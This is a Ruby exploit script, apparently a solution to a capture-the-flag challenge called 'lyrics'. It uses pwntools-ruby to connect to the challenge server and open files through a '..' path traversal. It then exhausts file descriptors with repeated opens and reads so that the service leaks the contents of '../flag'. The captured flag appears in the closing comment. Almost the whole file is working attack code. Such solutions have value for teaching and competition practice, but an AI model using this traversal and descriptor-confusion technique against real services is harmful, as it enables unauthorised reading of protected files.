#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'lyrics.hackable.software', 4141
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64'
# context.log_level = :debug
16.times { z.puts %w[open .. lyrics] }

16.times do
  (@local ? 25 : 24).times { z.puts "read\n0" }
end
(16+16*(@local ? 25 : 24)).times { z.gets 'Command' }
consume = @local ? 8 : 12
consume.times { z.puts ['open','The Beatles','Girl'] }
z.puts %w[open .. flag]

30.times { z.puts %w[read 0] }
z.puts ['read',  consume]
z.puts %w[read 0]

z.interact

# DrgnS{Huh_Ass3rti0n5_can_b3_unre1i4b13}
